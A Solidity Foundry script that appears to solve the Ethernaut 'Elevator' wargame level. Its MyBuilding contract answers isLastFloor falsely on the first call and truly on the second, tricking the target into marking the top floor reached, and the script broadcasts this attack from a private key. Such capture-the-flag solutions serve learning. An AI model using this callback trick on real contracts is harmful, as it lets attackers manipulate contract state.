// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MyBuilding{
    bool private mySwitch;
    Elevator public elevatorInstance = Elevator(0xf38aE8BD02b421Aae3271919Cb934124f846539e);

    function startAttack() external{
        elevatorInstance.goTo(0);
    } 

    function isLastFloor(uint _floor) external returns (bool){
        if(!mySwitch){
            mySwitch = true;
            return false; 
        }else{
            return true;
        }
    } 
} 

contract ElevatorSolution is Script {
   
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding myBuilding = new MyBuilding();
        myBuilding.startAttack();
        vm.stopBroadcast();
    }
}
